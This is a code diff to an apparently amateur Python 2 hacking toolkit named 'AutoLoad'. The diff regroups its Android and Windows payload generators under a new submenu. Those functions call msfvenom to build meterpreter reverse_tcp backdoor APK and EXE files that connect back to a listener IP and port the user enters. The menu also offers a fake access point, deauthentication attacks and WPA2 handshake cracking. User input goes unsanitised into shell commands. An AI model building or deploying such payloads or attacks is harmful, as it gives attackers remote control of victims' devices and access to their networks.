@@ -12,6 +12,7 @@ import socket
 import loading
 managed=open('/usr/share/managed.txt').read()
 monitor=open('/usr/share/monitor.txt').read()
+helpi=open('/usr/share/help.txt').read()
 os.system('resize -s 19 92')
 os.system('clear')
 print(Fore.GREEN +"                        Welcome to                   |::::::Follow Me on::::::")
@@ -43,41 +44,70 @@ def check_internet():
         print(Fore.GREEN +"Connected")
         
 #------------------------------------------------------------------------------------------------------------------------------------------------------------
-def android():
+def payloads():
+    def android():
+        os.system('clear')
+        print(Fore.GREEN +"[*]:::::: Payload Creator ::::::")
+        print("")
+        print("[]Create Payload For Android")
+        print("")
+        print("[*]Enter the IP and PORT you want to Listen on ")
+        print("")
+        ip=raw_input(Fore.BLUE +"[IP:] > ")
+        port=raw_input("[PORT:] > ")
+        name=raw_input("[Name of the File:] > ")
+        path=raw_input("File Save to[add '/' in the end]: ")
+        print("Payload is going to Saved in " +path+name+ ".apk")
+        print("[]Generating...........")
+        os.system('msfvenom -p android/meterpreter/reverse_tcp --platform android LHOST=' +ip+ ' LPORT=' +port+ ' -o'+path+name+ '.apk')
+        print("")
+        print("Done..")
+        os.system('clear')
+        import Autoload
+        
+    def windows():
+        os.system('clear')
+        print(Fore.GREEN +"[*]:::::: Payload Creator ::::::")
+        print("")
+        print("[]Create Payload For Windows")
+        print("")
+        print("[*]Enter the IP and PORT you want to Listen on ")
+        print("")
+        ip=raw_input(Fore.BLUE +"[IP:] > ")
+        port=raw_input("[PORT:] > ")
+        name=raw_input("[Name of the File:] > ")
+        path=raw_input("File Save to[add '/' in the end]: ")
+        print("Payload is going to Saved in " +path+name+ ".exe")
+        print("[]Generating...........")
+        os.system('msfvenom -p windows/meterpreter/reverse_tcp --platform windows LHOST=' +ip+ ' LPORT=' +port+ ' -o' +path+name+'.exe')
+        print("")
+        print("Done..")
+        os.system('clear')
+        import Autoload
+    def user_inputpay():
+        print(Fore.GREEN +"[*]:::::: Payload Creator ::::::")
+        print("")
+        print(Fore.BLUE +"1.) Create a Android payload")
+        print("2.) Create a Windows payload")
+        print("3.) Back")
+        print("4.) Exit")
+        print("")
+        while True:
+            userpay=input(Fore.BLUE +"[autoload:] > ")
+            if userpay == 1:
+                android()
+            elif userpay == 2:
+                windows()
+            elif userpay == 3:
+                import Autoload
+            elif userpay == 4:
+                print("")
+                print(Fore.GREEN +"Thanks For Using AutoLoad")
+                sys.exit()
+            else:
+                print(Fore.RED +"Wrong Choice")
     os.system('clear')
-    print(Fore.GREEN +"[*]::::::Create Payload For Android::::::")
-    print("")
-    print("[*]Enter the IP and PORT you want to Listen on ")
-    print("")
-    ip=raw_input(Fore.BLUE +"[IP:] > ")
-    port=raw_input("[PORT:] > ")
-    name=raw_input("[Name of the File:] > ")
-    path=raw_input("File Save to[add '/' in the end]: ")
-    print("Payload is going to Saved in " +path+name+ ".apk")
-    print("[]Generating...........")
-    os.system('msfvenom -p android/meterpreter/reverse_tcp --platform android LHOST=' +ip+ ' LPORT=' +port+ ' -o'+path+name+ '.apk')
-    print("")
-    print("Done..")
-    os.system('clear')
-    import Autoload
-#------------------------------------------------------------------------------------------------------------------------------------------------------------
-def windows():
-    os.system('clear')
-    print(Fore.GREEN +"[*]::::::Create Payload For Windows::::::")
-    print("")
-    print("[*]Enter the IP and PORT you want to Listen on ")
-    print("")
-    ip=raw_input(Fore.BLUE +"[IP:] > ")
-    port=raw_input("[PORT:] > ")
-    name=raw_input("[Name of the File:] > ")
-    path=raw_input("File Save to[add '/' in the end]: ")
-    print("Payload is going to Saved in " +path+name+ ".exe")
-    print("[]Generating...........")
-    os.system('msfvenom -p windows/meterpreter/reverse_tcp --platform windows LHOST=' +ip+ ' LPORT=' +port+ ' -o' +path+name+'.exe')
-    print("")
-    print("Done..")
-    os.system('clear')
-    import Autoload
+    user_inputpay()
 #------------------------------------------------------------------------------------------------------------------------------------------------------------
 def helppp():
     os.system('clear')
@@ -211,8 +241,8 @@ def brute_force():
     
 #------------------------------------------------------------------------------------------------------------------------------------------------------------        
 print("")
-print("|1.)"+Fore.WHITE +" Make a Android Payload "+Fore.GREEN +"|5.)"+Fore.WHITE +" GeoLocate an IP "+Fore.GREEN +     "    |11.)"+Fore.WHITE +" Help")
-print(Fore.GREEN +"|2.)"+Fore.WHITE +" Make a Windows Payload "+Fore.GREEN +"|6.)"+Fore.WHITE +" View Public IP  "+Fore.GREEN + "    |22.)"+Fore.WHITE +" Update")
+print("|1.)"+Fore.WHITE +" Create Payload         "+Fore.GREEN +"|5.)"+Fore.WHITE +" GeoLocate an IP "+Fore.GREEN +     "    |11.)"+Fore.WHITE +" Help")
+print(Fore.GREEN +"|2.)"+Fore.WHITE +"                    "+Fore.GREEN +"|6.)"+Fore.WHITE +" View Public IP  "+Fore.GREEN + "    |22.)"+Fore.WHITE +" Update")
 print(Fore.GREEN +"|3.)"+Fore.WHITE +" Create Fake AP         "+Fore.GREEN +"|7.)"+Fore.WHITE +" Crack Wpa2 HandShake"+Fore.GREEN +"|33.)"+Fore.WHITE +" Exit  ")
 print(Fore.GREEN +"|4.)"+Fore.WHITE +" Deauth Attack          "+Fore.GREEN +"|                    "+Fore.GREEN +"    |      ")
 print("")
@@ -220,11 +250,11 @@ while True:
     try:
         user=input(Fore.BLUE +"[autoload] > ")
         if user == 1:
-            android()
+            payloads()
         elif user == 2:
-            windows()
+            pass
         elif user == 11:
-            helppp()
+            print (helpi)
         elif user == 33:
             print("")
             print(Fore.GREEN +"Thanks for using AutoLOad")
